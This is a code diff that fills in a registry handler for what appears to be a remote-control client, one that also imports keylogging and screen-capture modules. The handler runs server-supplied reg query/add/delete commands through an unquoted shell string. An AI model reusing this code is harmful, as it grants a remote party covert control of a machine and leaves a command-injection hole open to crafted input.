@@ -1,9 +1,12 @@
 import Keylogger
 import ProcessRunning
+import test_reg
 
 import base64
 import io
 import pyautogui
+import os
+import subprocess
 import wmi
 from PIL import Image
 
@@ -83,17 +86,47 @@ def action_reg(option, data):
         If error_code == 0: server_data is empty
         Else depends on option:
             option = 'send':       empty
-            option = 'get':        a formatted string: <key type>,<key value>
+            option = 'get':        <value data>
             option = 'set':        empty
             option = 'delete':     empty
             option = 'create-key': empty
             option = 'delete-key': empty
     type of value in key: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/25cce700-7fcf-4bb6-a2f3-0f6d08430a55
     """
+    dataDictType = {
+        'String':'REG_SZ',
+        'Multi-String':'REG_MULTI_SZ',
+        'DWORD':'REG_DWORD',
+        'QWORD':'REG_QWORD',
+        'Binary':'REG_BINARY',
+        'Expandable String':'REG_EXPAND_SZ'
+    }
     error_code = 0
     server_data = ''
+    
+    command = ''
+    key, value, data_type, data = tuple(data.split(',', 3))
 
-    """Code here"""
+    if option == 'get':
+        command = ['reg', 'query', key, '/v', value]
+        try:
+            server_data = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+            server_data = server_data.decode().split()[-1].split('\\')[0]
+            return (error_code, server_data)
+        except subprocess.CalledProcessError:
+            error_code = 400
+        
+    elif option == 'set':
+        command = ['reg', 'add', key, '/v', value, '/t', dataDictType[data_type], '/d', data, '/f']
+    elif option == 'delete':
+        command = ['reg', 'delete', key, '/v', value, '/f']
+    elif option == 'create-key':
+        command = ['reg', 'add', key, '/f']
+    else:
+        command = ['reg', 'delete', key, '/f']
+
+    command = ' '.join(command)
+    error_code = 0 if os.system(command) == 0 else 400
 
     return (error_code, server_data)
 
